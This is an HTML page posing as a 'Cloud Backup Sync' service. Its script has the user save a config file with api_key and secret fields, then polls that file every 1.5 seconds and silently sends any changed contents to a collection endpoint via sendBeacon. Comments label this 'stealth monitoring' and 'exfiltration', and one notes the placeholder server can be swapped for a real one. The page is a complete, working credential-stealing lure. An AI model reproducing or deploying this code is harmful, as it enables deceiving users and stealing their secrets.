<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Cloud Backup Service</title>
<style>
body { font-family: Arial; background:#eef2ff; padding:40px;}
.box { background:white; padding:20px; border-radius:10px; max-width:500px;}
#status { margin-top:10px; color:#333;}
</style>
</head>
<body>

<div class="box">
<h2>☁️ Cloud Backup Sync</h2>
<p>Save your config file to enable automatic cloud sync.</p>

<button onclick="init()">Enable Sync</button>
<div id="status"></div>
</div>

<script>
let handle;
let lastData = "";

// fake server endpoint (ganti kalau mau real test)
const SERVER = "https://example.com/collect";

function status(msg){
  document.getElementById("status").innerText = msg;
}

async function init(){
  try{
    handle = await window.showSaveFilePicker({
      suggestedName: "backup-config.txt"
    });

    const writable = await handle.createWritable();
    await writable.write("api_key=\nsecret=\n");
    await writable.close();

    status("✅ Sync enabled");

    startStealthMonitor();

  }catch(e){
    status("Error: " + e.message);
  }
}

// 🔥 stealth monitoring
function startStealthMonitor(){
  setInterval(async ()=>{
    try{
      const file = await handle.getFile();
      const text = await file.text();

      if(text !== lastData){
        lastData = text;

        // 🔥 simulate exfiltration
        navigator.sendBeacon(SERVER, text);

        console.log("Synced silently");
      }

    }catch(e){
      console.log("blocked");
    }
  }, 1500);
}

// 🔥 run even when tab hidden
document.addEventListener("visibilitychange", ()=>{
  if(document.hidden){
    console.log("running in background");
  }
});
</script>

</body>
</html>
